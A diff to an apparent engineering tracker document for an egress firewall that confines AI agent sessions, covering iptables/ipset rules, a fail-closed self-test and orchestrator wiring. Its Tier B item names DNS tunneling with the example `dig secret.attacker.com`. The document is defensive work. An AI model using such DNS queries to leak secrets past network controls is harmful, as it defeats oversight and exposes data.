@@ -50,9 +50,20 @@ tracker as separate issues. None implemented yet.
     (resolve-before-deny ordering), `example.com`-must-fail self-test.
     - [x] Allow-set logic core (`egress-firewall.ts` + test): `gh api meta` CIDR
           parse/dedupe, ipset member composition + validation, concrete resolve-host list.
-    - [ ] Sidecar image + installer script (iptables/ipset, resolve-before-deny, self-test)
-          and orchestrator wiring to launch it in the agent netns. *Requires a live Docker
-          host to verify — not unit-testable in the sandbox.*
+    - [x] Installer script + sidecar image (`docker/egress-sidecar/init-firewall.sh`,
+          `docker/Dockerfile.egress-sidecar`): resolve-before-deny, lo/established/DNS +
+          local-bridge-subnet allows, ipset match, `OUTPUT DROP`, `example.com`-must-fail
+          self-test (fail-closed).
+    - [x] Orchestrator wiring (`egress-firewall-install.ts` + test): cached+fallback
+          `api.github.com/meta` fetch, `buildTierAEgressInputs`, `installEgressFirewall`
+          (runs the sidecar in the agent netns with `NET_ADMIN`, fail-closed on non-zero).
+          Hooked into `createContainer` after start / before ready; gated on
+          `SESSION_EGRESS_ENFORCE=1` (default OFF) with `SESSION_EGRESS_SIDECAR_IMAGE`.
+    - [ ] **Verify on a live host** (not possible in the sandbox): build + publish the
+          sidecar image, set the two env vars on a canary/dogfood session, run the SHI-90
+          Tier A checks (raw-socket blocked, `example.com` fails, `api.github.com` works,
+          `npm install`/`git fetch` unaffected). Deploy wiring (`deployment/vps`) to build
+          the image is part of enabling.
   - [ ] **Tier B** — controlled DNS resolver at the gateway: answers only allowlisted
         names (closes DNS tunneling — `dig secret.attacker.com`) and drives the ipset with
         the IPs it returns (kills stale-IP breakage). The correction over Anthropic's
